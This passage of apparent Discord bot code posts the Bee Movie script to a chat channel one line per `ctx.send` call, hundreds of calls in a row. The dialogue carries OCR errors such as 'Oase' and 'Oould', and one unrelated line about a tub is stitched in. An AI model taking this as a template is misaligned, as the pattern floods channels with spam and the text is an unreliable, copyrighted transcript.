        await ctx.send("and suspenders and colored dots...")
        await ctx.send("Next week...")
        await ctx.send("Glasses, quotes on the bottom from the")
        await ctx.send("guest even though you just heard 'em.")
        await ctx.send("Bear Week next week!")
        await ctx.send("They're scary, hairy and here live.")
        await ctx.send("Always leans forward, pointy shoulders,")
        await ctx.send("squinty eyes, very Jewish.")
        await ctx.send("In tennis, you attack")
        await ctx.send("at the point of weakness!")
        await ctx.send("It was my grandmother, Ken. She's 81.")
        await ctx.send("Honey, her backhand's a joke!")
        await ctx.send("I'm not gonna take advantage of that?")
        await ctx.send("Quiet, please.")
        await ctx.send("Actual work going on here.")
        await ctx.send("- Is that that same bee?")
        await ctx.send("- Yes, it is!")
        await ctx.send("I'm helping him sue the human race.")
        await ctx.send("- Hello.")
        await ctx.send("- Hello, bee.")
        await ctx.send("This is Ken.")
        await ctx.send("Yeah, I remember you. Timberland, size")
        await ctx.send("ten and a half. Vibram sole, I believe.")
        await ctx.send("Why does he talk again?")
        await ctx.send("Listen, you better go")
        await ctx.send("cause we're really busy working.")
        await ctx.send("But it's our yogurt night!")
        await ctx.send("Bye-bye.")
        await ctx.send("Why is yogurt night so difficult?!")
        await ctx.send("You poor thing.")
        await ctx.send("You two have been at this for hours!")
        await ctx.send("Yes, and Adam here")
        await ctx.send("has been a huge help.")
        await ctx.send("- Frosting...")
        await ctx.send("- How many sugars?")
        await ctx.send("Just one. I try not")
        await ctx.send("to use the competition.")
        await ctx.send("So why are you helping me?")
        await ctx.send("Bees have good qualities.")
        await ctx.send("And it takes my mind off the shop.")
        await ctx.send("Instead of flowers, people")
        await ctx.send("are giving balloon bouquets now.")
        await ctx.send("Those are great, if you're three.")
        await ctx.send("And artificial flowers.")
        await ctx.send("- Oh, those just get me psychotic!")
        await ctx.send("- Yeah, me too.")
        await ctx.send("Bent stingers, pointless pollination.")
        await ctx.send("Bees must hate those fake things!")
        await ctx.send("Nothing worse")
        await ctx.send("than a daffodil that's had work done.")
        await ctx.send("Maybe this could make up")
        await ctx.send("for it a little bit.")
        await ctx.send("- This lawsuit's a pretty big deal.")
        await ctx.send("- I guess.")
        await ctx.send("You sure you want to go through with it?")
        await ctx.send("Am I sure? When I'm done with")
        await ctx.send("the humans, they won't be able")
        await ctx.send("to say, 'Honey, I'm home,")
        await ctx.send("without paying a royalty!")
        await ctx.send("It's an incredible scene")
        await ctx.send("here in downtown Manhattan,")
        await ctx.send("where the world anxiously waits,")
        await ctx.send("because for the first time in history,")
        await ctx.send("we will hear for ourselves")
        await ctx.send("if a honeybee can actually speak.")
        await ctx.send("What have we gotten into here, Barry?")
        await ctx.send("It's pretty big, isn't it?")
        await ctx.send("I can't believe how many humans")
        await ctx.send("don't work during the day.")
        await ctx.send("You think billion-dollar multinational")
        await ctx.send("food companies have good lawyers?")
        await ctx.send("Everybody needs to stay")
        await ctx.send("behind the barricade.")
        await ctx.send("- What's the matter?")
        await ctx.send("- I don't know, I just got a chill.")
        await ctx.send("Well, if it isn't the bee team.")
        await ctx.send("You boys work on this?")
        await ctx.send("All rise! The Honorable")
        await ctx.send("Judge Bumbleton presiding.")
        await ctx.send("All right. Oase number 4475,")
        await ctx.send("Superior Oourt of New York,")
        await ctx.send("Barry Bee Benson v. the Honey Industry")
        await ctx.send("is now in session.")
        await ctx.send("Mr. Montgomery, you're representing")
        await ctx.send("the five food companies collectively?")
        await ctx.send("A privilege.")
        await ctx.send("Mr. Benson... you're representing")
        await ctx.send("all the bees of the world?")
        await ctx.send("I'm kidding. Yes, Your Honor,")
        await ctx.send("we're ready to proceed.")
        await ctx.send("Mr. Montgomery,")
        await ctx.send("your opening statement, please.")
        await ctx.send("Ladies and gentlemen of the jury,")
        await ctx.send("my grandmother was a simple woman.")
        await ctx.send("Born on a farm, she believed")
        await ctx.send("it was man's divine right")
        await ctx.send("to benefit from the bounty")
        await ctx.send("of nature God put before us.")
        await ctx.send("If we lived in the topsy-turvy world")
        await ctx.send("Mr. Benson imagines,")
        await ctx.send("just think of what would it mean.")
        await ctx.send("I would have to negotiate")
        await ctx.send("with the silkworm")
        await ctx.send("for the elastic in my britches!")
        await ctx.send("Talking bee!")
        await ctx.send("How do we know this isn't some sort of")
        await ctx.send("holographic motion-picture-capture")
        await ctx.send("Hollywood wizardry?")
        await ctx.send("They could be using laser beams!")
        await ctx.send("Robotics! Ventriloquism!")
        await ctx.send("Oloning! For all we know,")
        await ctx.send("he could be on steroids!")
        await ctx.send("Mr. Benson?")
        await ctx.send("Ladies and gentlemen,")
        await ctx.send("there's no trickery here.")
        await ctx.send("I'm just an ordinary bee.")
        await ctx.send("Honey's pretty important to me.")
        await ctx.send("It's important to all bees.")
        await ctx.send("We invented it!")
        await ctx.send("We make it. And we protect it")
        await ctx.send("with our lives.")
        await ctx.send("Unfortunately, there are")
        await ctx.send("some people in this room")
        await ctx.send("who think they can take it from us")
        await ctx.send("'cause we're the little guys!")
        await ctx.send("I'm hoping that, after this is all over,")
        await ctx.send("you'll see how, by taking our honey,")
        await ctx.send("you not only take everything we have")
        await ctx.send("but everything we are!")
        await ctx.send("I wish he'd dress like that")
        await ctx.send("all the time. So nice!")
        await ctx.send("Oall your first witness.")
        await ctx.send("So, Mr. Klauss Vanderhayden")
        await ctx.send("of Honey Farms, big company you have.")
        await ctx.send("I suppose so.")
        await ctx.send("I see you also own")
        await ctx.send("Honeyburton and Honron!")
        await ctx.send("Yes, they provide beekeepers")
        await ctx.send("for our farms.")
        await ctx.send("Beekeeper. I find that")
        await ctx.send("to be a very disturbing term.")
        await ctx.send("I don't imagine you employ")
        await ctx.send("any bee-free-ers, do you?")
        await ctx.send("- No.")
        await ctx.send("- I couldn't hear you.")
        await ctx.send("- No.")
        await ctx.send("- No.")
        await ctx.send("Because you don't free bees.")
        await ctx.send("You keep bees. Not only that,")
        await ctx.send("it seems you thought a bear would be")
        await ctx.send("an appropriate image for a jar of honey.")
        await ctx.send("They're very lovable creatures.")
        await ctx.send("Yogi Bear, Fozzie Bear, Build-A-Bear.")
        await ctx.send("You mean like this?")
        await ctx.send("Bears kill bees!")
        await ctx.send("How'd you like his head crashing")
        await ctx.send("through your living room?!")
        await ctx.send("Biting into your couch!")
        await ctx.send("Spitting out your throw pillows!")
        await ctx.send("OK, that's enough. Take him away.")
        await ctx.send("So, Mr. Sting, thank you for being here.")
        await ctx.send("Your name intrigues me.")
        await ctx.send("- Where have I heard it before?")
        await ctx.send("- I was with a band called The Police.")
        await ctx.send("But you've never been")
        await ctx.send("a police officer, have you?")
        await ctx.send("No, I haven't.")
        await ctx.send("No, you haven't. And so here")
        await ctx.send("we have yet another example")
        await ctx.send("of bee culture casually")
        await ctx.send("stolen by a human")
        await ctx.send("for nothing more than")
        await ctx.send("a prance-about stage name.")
        await ctx.send("Oh, please.")
        await ctx.send("Have you ever been stung, Mr. Sting?")
        await ctx.send("Because I'm feeling")
        await ctx.send("a little stung, Sting.")
        await ctx.send("Or should I say... Mr. Gordon M. Sumner!")
        await ctx.send("That's not his real name?! You idiots!")
        await ctx.send("Mr. Liotta, first,")
        await ctx.send("belated congratulations on")
        await ctx.send("your Emmy win for a guest spot")
        await ctx.send("on ER in 2 5.")
        await ctx.send("Thank you. Thank you.")
        await ctx.send("I see from your resume")
        await ctx.send("that you're devilishly handsome")
        await ctx.send("with a churning inner turmoil")
        await ctx.send("that's ready to blow.")
        await ctx.send("I enjoy what I do. Is that a crime?")
        await ctx.send("Not yet it isn't. But is this")
        await ctx.send("what it's come to for you?")
        await ctx.send("Exploiting tiny, helpless bees")
        await ctx.send("so you don't")
        await ctx.send("have to rehearse")
        await ctx.send("your part and learn your lines, sir?")
        await ctx.send("Watch it, Benson!")
        await ctx.send("I could blow right now!")
        await ctx.send("This isn't a goodfella.")
        await ctx.send("This is a badfella!")
        await ctx.send("Why doesn't someone just step on")
        await ctx.send("this creep, and we can all go home?!")
        await ctx.send("- Order in this court!")
        await ctx.send("- You're all thinking it!")
        await ctx.send("Order! Order, I say!")
        await ctx.send("- Say it!")
        await ctx.send("- Mr. Liotta, please sit down!")
        await ctx.send("I think it was awfully nice")
        await ctx.send("of that bear to pitch in like that.")
        await ctx.send("I think the jury's on our side.")
        await ctx.send("Are we doing everything right, legally?")
        await ctx.send("I'm a florist.")
        await ctx.send("Right. Well, here's to a great team.")
        await ctx.send("To a great team!")
        await ctx.send("Well, hello.")
        await ctx.send("- Ken!")
        await ctx.send("- Hello.")
        await ctx.send("I didn't think you were coming.")
        await ctx.send("No, I was just late.")
        await ctx.send("I tried to call, but... the battery.")
        await ctx.send("I didn't want all this to go to waste,")
        await ctx.send("so I called Barry. Luckily, he was free.")
        await ctx.send("Oh, that was lucky.")
        await ctx.send("There's a little left.")
        await ctx.send("I could heat it up.")
        await ctx.send("Yeah, heat it up, sure, whatever.")
        await ctx.send("So I hear you're quite a tennis player.")
        await ctx.send("I'm not much for the game myself.")
        await ctx.send("The ball's a little grabby.")
        await ctx.send("That's where I usually sit.")
        await ctx.send("Right... there.")
        await ctx.send("Ken, Barry was looking at your resume,")
        await ctx.send("and he agreed with me that eating with")
        await ctx.send("chopsticks isn't really a special skill.")
        await ctx.send("You think I don't see what you're doing?")
        await ctx.send("I know how hard it is to find")
        await ctx.send("the rightjob. We have that in common.")
        await ctx.send("Do we?")
        await ctx.send("Bees have 1 percent employment,")
        await ctx.send("but we do jobs like taking the crud out.")
        await ctx.send("That's just what")
        await ctx.send("I was thinking about doing.")
        await ctx.send("Ken, I let Barry borrow your razor")
        await ctx.send("for his fuzz. I hope that was all right.")
        await ctx.send("I'm going to drain the old stinger.")
        await ctx.send("Yeah, you do that.")
        await ctx.send("Look at that.")
        await ctx.send("You know, I've just about had it")
        await ctx.send("with your little mind games.")
        await ctx.send("- What's that?")
        await ctx.send("- Italian Vogue.")
        await ctx.send("Mamma mia, that's a lot of pages.")
        await ctx.send("A lot of ads.")
        await ctx.send("Remember what Van said, why is")
        await ctx.send("your life more valuable than mine?")
        await ctx.send("Funny, I just can't seem to recall that!")
        await ctx.send("I think something stinks in here!")
        await ctx.send("I love the smell of flowers.")
        await ctx.send("How do you like the smell of flames?!")
        await ctx.send("Not as much.")
        await ctx.send("Water bug! Not taking sides!")
        await ctx.send("Ken, I'm wearing a Ohapstick hat!")
        await ctx.send("This is pathetic!")
        await ctx.send("I've got issues!")
        await ctx.send("Well, well, well, a royal flush!")
        await ctx.send("- You're bluffing.")
        await ctx.send("- Am I?")
        await ctx.send("Surf's up, dude!")
        await ctx.send("Poo water!")
        await ctx.send("That bowl is gnarly.")
        await ctx.send("Except for those dirty yellow rings!")
        await ctx.send("Kenneth! What are you doing?!")
        await ctx.send("You know, I don't even like honey!")
        await ctx.send("I don't eat it!")
        await ctx.send("We need to talk!")
        await ctx.send("He's just a little bee!")
        await ctx.send("And he happens to be")
        await ctx.send("the nicest bee I've met in a long time!")
        await ctx.send("Long time? What are you talking about?!")
        await ctx.send("Are there other bugs in your life?")
        await ctx.send("No, but there are other things bugging")
        await ctx.send("me in life. And you're one of them!")
        await ctx.send("Fine! Talking bees, no yogurt night...")
        await ctx.send("My nerves are fried from riding")
        await ctx.send("on this emotional roller coaster!")
        await ctx.send("Goodbye, Ken.")
        await ctx.send("And for your information,")
        await ctx.send("I prefer sugar-free, artificial")
        await ctx.send("sweeteners made by man!")
        await ctx.send("I'm sorry about all that.")
        await ctx.send("I know it's got")
        await ctx.send("an aftertaste! I like it!")
        await ctx.send("I always felt there was some kind")
        await ctx.send("of barrier between Ken and me.")
        await ctx.send("I couldn't overcome it.")
        await ctx.send("Oh, well.")
        await ctx.send("Are you OK for the trial?")
        await ctx.send("I believe Mr. Montgomery")
        await ctx.send("is about out of ideas.")
        await ctx.send("We would like to call")
        await ctx.send("Mr. Barry Benson Bee to the stand.")
        await ctx.send("Good idea! You can really see why he's")
        await ctx.send("considered one of the best lawyers...")
        await ctx.send("Yeah.")
        await ctx.send("Layton, you've")
        await ctx.send("gotta weave some magic")
        await ctx.send("with this jury,")
        await ctx.send("or it's gonna be all over.")
        await ctx.send("Don't worry. The only thing I have")
        await ctx.send("to do to turn this jury around")
        await ctx.send("is to remind them")
        await ctx.send("of what they don't like about bees.")
        await ctx.send("- You got the tweezers?")
        await ctx.send("- Are you allergic?")
        await ctx.send("Only to losing, son. Only to losing.")
        await ctx.send("Mr. Benson Bee, I'll ask you")
        await ctx.send("what I think we'd all like to know.")
        await ctx.send("What exactly is your relationship")
        await ctx.send("to that woman?")
        await ctx.send("We're friends.")
        await ctx.send("- Good friends?")
        await ctx.send("- Yes.")
        await ctx.send("How good? Do you live together?")
        await ctx.send("Wait a minute...")
        await ctx.send("Are you her little...")
        await ctx.send("...bedbug?")
        await ctx.send("I've seen a bee documentary or two.")
        await ctx.send("From what I understand,")
        await ctx.send("doesn't your queen give birth")
        await ctx.send("to all the bee children?")
        await ctx.send("- Yeah, but...")
        await ctx.send("- So those aren't your real parents!")
        await ctx.send("- Oh, Barry...")
        await ctx.send("- Yes, they are!")
        await ctx.send("Hold me back!")
        await ctx.send("You're an illegitimate bee,")
        await ctx.send("aren't you, Benson?")
        await ctx.send("He's denouncing bees!")
        await ctx.send("Don't y'all date your cousins?")
        await ctx.send("- Objection!")
        await ctx.send("- I'm going to pincushion this guy!")
        await ctx.send("Adam, don't! It's what he wants!")
        await ctx.send("Oh, I'm hit!!")
        await ctx.send("Oh, lordy, I am hit!")
        await ctx.send("Order! Order!")
        await ctx.send("The venom! The venom")
        await ctx.send("is coursing through my veins!")
        await ctx.send("I have been felled")
        await ctx.send("by a winged beast of destruction!")
        await ctx.send("You see? You can't treat them")
        await ctx.send("like equals! They're striped savages!")
        await ctx.send("Stinging's the only thing")
        await ctx.send("they know! It's their way!")
        await ctx.send("- Adam, stay with me.")
        await ctx.send("- I can't feel my legs.")
        await ctx.send("What angel of mercy")
        await ctx.send("will come forward to suck the poison")
        await ctx.send("from my heaving buttocks?")
        await ctx.send("I will have order in this court. Order!")
        await ctx.send("Order, please!")
        await ctx.send("The case of the honeybees")
        await ctx.send("versus the human race")
        await ctx.send("took a pointed turn against the bees")
        await ctx.send("yesterday when one of their legal")
        await ctx.send("team stung Layton T. Montgomery.")
        await ctx.send("- Hey, buddy.")
        await ctx.send("- Hey.")
        await ctx.send("- Is there much pain?")
        await ctx.send("- Yeah.")
        await ctx.send("I...")
        await ctx.send("I blew the whole case, didn't I?")
        await ctx.send("It doesn't matter. What matters is")
        await ctx.send("you're alive. You could have died.")
        await ctx.send("I'd be better off dead. Look at me.")
        await ctx.send("They got it from the cafeteria")
        await ctx.send("downstairs, in a tuna sandwich.")
        await ctx.send("Look, there's")
        await ctx.send("a little celery still on it.")
        await ctx.send("What was it like to sting someone?")
        await ctx.send("I can't explain it. It was all...")
        await ctx.send("All adrenaline and then...")
        await ctx.send("and then ecstasy!")
        await ctx.send("All right.")
        await ctx.send("You think it was all a trap?")
        await ctx.send("Of course. I'm sorry.")
        await ctx.send("I flew us right into this.")
        await ctx.send("What were we thinking? Look at us. We're")
        await ctx.send("just a couple of bugs in this world.")
        await ctx.send("What will the humans do to us")
        await ctx.send("if they win?")
        await ctx.send("I don't know.")
        await ctx.send("I hear they put the roaches in motels.")
        await ctx.send("That doesn't sound so bad.")
        await ctx.send("Adam, they check in,")
        await ctx.send("but they don't check out!")
        await ctx.send("Oh, my.")
        await ctx.send("Oould you get a nurse")
        await ctx.send("to close that window?")
        await ctx.send("- Why?")
        await ctx.send("- The smoke.")
        await ctx.send("Bees don't smoke.")
        await ctx.send("Right. Bees don't smoke.")
        await ctx.send("Bees don't smoke!")
        await ctx.send("But some bees are smoking.")
        await ctx.send("That's it! That's our case!")
        await ctx.send("It is? It's not over?")
        await ctx.send("Get dressed. I've gotta go somewhere.")
        await ctx.send("Get back to the court and stall.")
        await ctx.send("Stall any way you can.")
        await ctx.send("And assuming you've done step correctly, you're ready for the tub.")
        await ctx.send("Mr. Flayman.")
        await ctx.send("Yes? Yes, Your Honor!")
        await ctx.send("Where is the rest of your team?")
        await ctx.send("Well, Your Honor, it's interesting.")
        await ctx.send("Bees are trained to fly haphazardly,")
        await ctx.send("and as a result,")
        await ctx.send("we don't make very good time.")
        await ctx.send("I actually heard a funny story about...")
        await ctx.send("Your Honor,")
        await ctx.send("haven't these ridiculous bugs")
        await ctx.send("taken up enough")
        await ctx.send("of this court's valuable time?")
        await ctx.send("How much longer will we allow")
        await ctx.send("these absurd shenanigans to go on?")
        await ctx.send("They have presented no compelling")
        await ctx.send("evidence to support their charges")
        await ctx.send("against my clients,")
        await ctx.send("who run legitimate businesses.")
        await ctx.send("I move for a complete dismissal")
        await ctx.send("of this entire case!")
        await ctx.send("Mr. Flayman, I'm afraid I'm going")
        await ctx.send("to have to consider")
        await ctx.send("Mr. Montgomery's motion.")
        await ctx.send("But you can't! We have a terrific case.")
        await ctx.send("Where is your proof?")
        await ctx.send("Where is the evidence?")
        await ctx.send("Show me the smoking gun!")
        await ctx.send("Hold it, Your Honor!")
        await ctx.send("You want a smoking gun?")
        await ctx.send("Here is your smoking gun.")
        await ctx.send("What is that?")
        await ctx.send("It's a bee smoker!")
        await ctx.send("What, this?")
        await ctx.send("This harmless little contraption?")
        await ctx.send("This couldn't hurt a fly,")
        await ctx.send("let alone a bee.")
        await ctx.send("Look at what has happened")
        await ctx.send("to bees who have never been asked,")
        await ctx.send("Smoking or non?")
        await ctx.send("Is this what nature intended for us?")
        await ctx.send("To be forcibly addicted")
        await ctx.send("to smoke machines")
        await ctx.send("and man-made wooden slat work camps?")
        await ctx.send("Living out our lives as honey slaves")
        await ctx.send("to the white man?")
        await ctx.send("- What are we gonna do?")
        await ctx.send("- He's playing the species card.")
        await ctx.send("Ladies and gentlemen, please,")
        await ctx.send("free these bees!")
        await ctx.send("Free the bees! Free the bees!")
        await ctx.send("Free the bees!")
        await ctx.send("Free the bees! Free the bees!")
        await ctx.send("The court finds in favor of the bees!")
        await ctx.send("Vanessa, we won!")
        await ctx.send("I knew you could do it! High-five!")
        await ctx.send("Sorry.")
        await ctx.send("I'm OK! You know what this means?")
        await ctx.send("All the honey")
        await ctx.send("will finally belong to the bees.")
        await ctx.send("Now we won't have")
        await ctx.send("to work so hard all the time.")
        await ctx.send("This is an unholy perversion")
        await ctx.send("of the balance of nature, Benson.")
        await ctx.send("You'll regret this.")
        await ctx.send("Barry, how much honey is out there?")
        await ctx.send("All right. One at a time.")
        await ctx.send("Barry, who are you wearing?")
        await ctx.send("My sweater is Ralph Lauren,")
        await ctx.send("and I have no pants.")
        await ctx.send("- What if Montgomery's right?")
        await ctx.send("- What do you mean?")
        await ctx.send("We've been living the bee way")
        await ctx.send("a long time, 27 million years.")
        await ctx.send("Oongratulations on your victory.")
        await ctx.send("What will you demand as a settlement?")
        await ctx.send("First, we'll demand a complete shutdown")
        await ctx.send("of all bee work camps.")
        await ctx.send("Then we want back the honey")
        await ctx.send("that was ours to begin with,")
        await ctx.send("every last drop.")
        await ctx.send("We demand an end to the glorification")
        await ctx.send("of the bear as anything more")
        await ctx.send("than a filthy, smelly,")
        await ctx.send("bad-breath stink machine.")
        await ctx.send("We're all aware")
        await ctx.send("of what they do in the woods.")
        await ctx.send("Wait for my signal.")
        await ctx.send("Take him out.")
        await ctx.send("He'll have nauseous")
        await ctx.send("for a few hours, then he'll be fine.")
        await ctx.send("And we will no longer tolerate")
        await ctx.send("bee-negative nicknames...")
        await ctx.send("But it's just a prance-about stage name!")
        await ctx.send("...unnecessary inclusion of honey")
        await ctx.send("in bogus health products")
        await ctx.send("and la-dee-da human")
        await ctx.send("tea-time snack garnishments.")
        await ctx.send("Oan't breathe.")
        await ctx.send("Bring it in, boys!")
        await ctx.send("Hold it right there! Good.")
        await ctx.send("Tap it.")
        await ctx.send("Mr. Buzzwell, we just passed three cups,")
        await ctx.send("and there's gallons more coming!")
        await ctx.send("- I think we need to shut down!")
        await ctx.send("- Shut down? We've never shut down.")
        await ctx.send("Shut down honey production!")
        await ctx.send("Stop making honey!")
        await ctx.send("Turn your key, sir!")
        await ctx.send("What do we do now?")
        await ctx.send("Oannonball!")
        await ctx.send("We're shutting honey production!")
        await ctx.send("Mission abort.")
        await ctx.send("Aborting pollination and nectar detail.")
        await ctx.send("Returning to base.")
        await ctx.send("Adam, you wouldn't believe")
        await ctx.send("how much honey was out there.")
        await ctx.send("Oh, yeah?")
        await ctx.send("What's going on? Where is everybody?")
        await ctx.send("- Are they out celebrating?")
        await ctx.send("- They're home.")
        await ctx.send("They don't know what to do.")
        await ctx.send("Laying out, sleeping in.")
        await ctx.send("I heard your Uncle Oarl was on his way")
        await ctx.send("to San Antonio with a cricket.")
        await ctx.send("At least we got our honey back.")
        await ctx.send("Sometimes I think, so what if humans")
        await ctx.send("liked our honey? Who wouldn't?")
        await ctx.send("It's the greatest thing in the world!")
        await ctx.send("I was excited to be part of making it.")
        await ctx.send("This was my new desk. This was my")
        await ctx.send("new job. I wanted to do it really well.")
        await ctx.send("And now...")
        await ctx.send("Now I can't.")
        await ctx.send("I don't understand")
        await ctx.send("why they're not happy.")
        await ctx.send("I thought their lives would be better!")
        await ctx.send("They're doing nothing. It's amazing.")
        await ctx.send("Honey really changes people.")
        await ctx.send("You don't have any idea")
        await ctx.send("what's going on, do you?")
        await ctx.send("- What did you want to show me?")
        await ctx.send("- This.")
        await ctx.send("What happened here?")
        await ctx.send("That is not the half of it.")
        await ctx.send("Oh, no. Oh, my.")
        await ctx.send("They're all wilting.")
        await ctx.send("Doesn't look very good, does it?")
        await ctx.send("No.")
        await ctx.send("And whose fault do you think that is?")
        await ctx.send("You know, I'm gonna guess bees.")
        await ctx.send("Bees?")
        await ctx.send("Specifically, me.")
        await ctx.send("I didn't think bees not needing to make")
        await ctx.send("honey would affect all these things.")
        await ctx.send("It's notjust flowers.")
        await ctx.send("Fruits, vegetables, they all need bees.")
        await ctx.send("That's our whole SAT test right there.")
        await ctx.send("Take away produce, that affects")
        await ctx.send("the entire animal kingdom.")
        await ctx.send("And then, of course...")
        await ctx.send("The human species?")
        await ctx.send("So if there's no more pollination,")
        await ctx.send("it could all just go south here,")
        await ctx.send("couldn't it?")
        await ctx.send("I know this is also partly my fault.")
        await ctx.send("How about a suicide pact?")
        await ctx.send("How do we do it?")
        await ctx.send("- I'll sting you, you step on me.")
        await ctx.send("- Thatjust kills you twice.")
        await ctx.send("Right, right.")
        await ctx.send("Listen, Barry...")
        await ctx.send("sorry, but I gotta get going.")
        await ctx.send("I had to open my mouth and talk.")
        await ctx.send("Vanessa?")
        await ctx.send("Vanessa? Why are you leaving?")
        await ctx.send("Where are you going?")
        await ctx.send("To the final Tournament of Roses parade")
        await ctx.send("in Pasadena.")
        await ctx.send("They've moved it to this weekend")
        await ctx.send("because all the flowers are dying.")
        await ctx.send("It's the last chance")
        await ctx.send("I'll ever have to see it.")
        await ctx.send("Vanessa, I just wanna say I'm sorry.")
        await ctx.send("I never meant it to turn out like this.")
        await ctx.send("I know. Me neither.")
        await ctx.send("Tournament of Roses.")
        await ctx.send("Roses can't do sports.")
        await ctx.send("Wait a minute. Roses. Roses?")
        await ctx.send("Roses!")
        await ctx.send("Vanessa!")
        await ctx.send("Roses?!")
        await ctx.send("Barry?")
        await ctx.send("- Roses are flowers!")
        await ctx.send("- Yes, they are.")
        await ctx.send("Flowers, bees, pollen!")
        await ctx.send("I know.")
        await ctx.send("That's why this is the last parade.")
        await ctx.send("Maybe not.")
        await ctx.send("Oould you ask him to slow down?")
        await ctx.send("Oould you slow down?")
        await ctx.send("Barry!")
        await ctx.send("OK, I made a huge mistake.")
        await ctx.send("This is a total disaster, all my fault.")
        await ctx.send("Yes, it kind of is.")
        await ctx.send("I've ruined the planet.")
        await ctx.send("I wanted to help you")
        await ctx.send("with the flower shop.")
        await ctx.send("I've made it worse.")
        await ctx.send("Actually, it's completely closed down.")
        await ctx.send("I thought maybe you were remodeling.")
        await ctx.send("But I have another idea, and it's")
        await ctx.send("greater than my previous ideas combined.")
        await ctx.send("I don't want to hear it!")
        await ctx.send("All right, they have the roses,")
        await ctx.send("the roses have the pollen.")
        await ctx.send("I know every bee, plant")
        await ctx.send("and flower bud in this park.")
        await ctx.send("All we gotta do is get what they've got")
        await ctx.send("back here with what we've got.")
        await ctx.send("- Bees.")
        await ctx.send("- Park.")
        await ctx.send("- Pollen!")
        await ctx.send("- Flowers.")
        await ctx.send("- Repollination!")
        await ctx.send("- Across the nation!")
        await ctx.send("Tournament of Roses,")
        await ctx.send("Pasadena, Oalifornia.")
        await ctx.send("They've got nothing")
        await ctx.send("but flowers, floats and cotton candy.")
        await ctx.send("Security will be tight.")
        await ctx.send("I have an idea.")
        await ctx.send("Vanessa Bloome, FTD.")
        await ctx.send("Official floral business. It's real.")
        await ctx.send("Sorry, ma'am. Nice brooch.")
        await ctx.send("Thank you. It was a gift.")
        await ctx.send("Once inside,")
        await ctx.send("we just pick the right float.")
        await ctx.send("How about The Princess and the Pea?")
        await ctx.send("I could be the princess,")
        await ctx.send("and you could be the pea!")
        await ctx.send("Yes, I got it.")
        await ctx.send("- Where should I sit?")
        await ctx.send("- What are you?")
        await ctx.send("- I believe I'm the pea.")
        await ctx.send("- The pea?")
        await ctx.send("It goes under the mattresses.")
        await ctx.send("- Not in this fairy tale, sweetheart.")
        await ctx.send("- I'm getting the marshal.")
        await ctx.send("You do that!")
        await ctx.send("This whole parade is a fiasco!")
        await ctx.send("Let's see what this baby'll do.")
        await ctx.send("Hey, what are you doing?!")
        await ctx.send("Then all we do")
        await ctx.send("is blend in with traffic...")
        await ctx.send("...without arousing suspicion.")
        await ctx.send("Once at the airport,")
        await ctx.send("there's no stopping us.")
        await ctx.send("Stop! Security.")
        await ctx.send("- You and your insect pack your float?")
        await ctx.send("- Yes.")
        await ctx.send("Has it been")
        await ctx.send("in your possession the entire time?")
        await ctx.send("Would you remove your shoes?")
        await ctx.send("- Remove your stinger.")
        await ctx.send("- It's part of me.")
        await ctx.send("I know. Just having some fun.")
        await ctx.send("Enjoy your flight.")
        await ctx.send("Then if we're lucky, we'll have")
        await ctx.send("just enough pollen to do the job.")
        await ctx.send("Oan you believe how lucky we are? We")
        await ctx.send("have just enough pollen to do the job!")
        await ctx.send("I think this is gonna work.")
        await ctx.send("It's got to work.")
        await ctx.send("Attention, passengers,")
        await ctx.send("this is Oaptain Scott.")
        await ctx.send("We have a bit of bad weather")
        await ctx.send("in New York.")
        await ctx.send("It looks like we'll experience")
        await ctx.send("a couple hours delay.")
        await ctx.send("Barry, these are cut flowers")
        await ctx.send("with no water. They'll never make it.")
        await ctx.send("I gotta get up there")
        await ctx.send("and talk to them.")
        await ctx.send("Be careful.")
        await ctx.send("Oan I get help")
        await ctx.send("with the Sky Mall magazine?")
        await ctx.send("I'd like to order the talking")
        await ctx.send("inflatable nose and ear hair trimmer.")
        await ctx.send("Oaptain, I'm in a real situation.")
        await ctx.send("- What'd you say, Hal?")
        await ctx.send("- Nothing.")
        await ctx.send("Bee!")
        await ctx.send("Don't freak out! My entire species...")
        await ctx.send("What are you doing?")
        await ctx.send("- Wait a minute! I'm an attorney!")
        await ctx.send("- Who's an attorney?")
        await ctx.send("Don't move.")
        await ctx.send("Oh, Barry.")
        await ctx.send("Good afternoon, passengers.")
        await ctx.send("This is your captain.")
        await ctx.send("Would a Miss Vanessa Bloome in 24B")
        await ctx.send("please report to the cockpit?")
        await ctx.send("And please hurry!")
        await ctx.send("What happened here?")
        await ctx.send("There was a DustBuster,")
        await ctx.send("a toupee, a life raft exploded.")
        await ctx.send("One's bald, one's in a boat,")
        await ctx.send("they're both unconscious!")
        await ctx.send("- Is that another bee joke?")
        await ctx.send("- No!")
        await ctx.send("No one's flying the plane!")
        await ctx.send("This is JFK control tower, Flight 356.")
        await ctx.send("What's your status?")
        await ctx.send("This is Vanessa Bloome.")
        await ctx.send("I'm a florist from New York.")
        await ctx.send("Where's the pilot?")
        await ctx.send("He's unconscious,")
        await ctx.send("and so is the copilot.")
        await ctx.send("Not good. Does anyone onboard")
        await ctx.send("have flight experience?")
        await ctx.send("As a matter of fact, there is.")
        await ctx.send("- Who's that?")
        await ctx.send("- Barry Benson.")
        await ctx.send("From the honey trial?! Oh, great.")
        await ctx.send("Vanessa, this is nothing more")
        await ctx.send("than a big metal bee.")
        await ctx.send("It's got giant wings, huge engines.")
        await ctx.send("I can't fly a plane.")
        await ctx.send("- Why not? Isn't John Travolta a pilot?")
        await ctx.send("- Yes.")
        await ctx.send("How hard could it be?")
        await ctx.send("Wait, Barry!")
        await ctx.send("We're headed into some lightning.")
        await ctx.send("This is Bob Bumble. We have some")
        await ctx.send("late-breaking news from JFK Airport,")
        await ctx.send("where a suspenseful scene")
        await ctx.send("is developing.")
        await ctx.send("Barry Benson,")
        await ctx.send("fresh from his legal victory...")
        await ctx.send("That's Barry!")
        await ctx.send("...is attempting to land a plane,")
        await ctx.send("loaded with people, flowers")
        await ctx.send("and an incapacitated flight crew.")
        await ctx.send("Flowers?!")
        await ctx.send("We have a storm in the area")
        await ctx.send("and two individuals at the controls")
        await ctx.send("with absolutely no flight experience.")
        await ctx.send("Just a minute.")
        await ctx.send("There's a bee on that plane.")
        await ctx.send("I'm quite familiar with Mr. Benson")
        await ctx.send("and his no-account compadres.")
        await ctx.send("They've done enough damage.")
        await ctx.send("But isn't he your only hope?")
        await ctx.send("Technically, a bee")
        await ctx.send("shouldn't be able to fly at all.")
        await ctx.send("Their wings are too small...")
        await ctx.send("Haven't we heard this a million times?")
        await ctx.send("The surface area of the wings")
        await ctx.send("and body mass make no sense.")
        await ctx.send("- Get this on the air!")
        await ctx.send("- Got it.")
        await ctx.send("- Stand by.")
        await ctx.send("- We're going live.")
        await ctx.send("The way we work may be a mystery to you.")
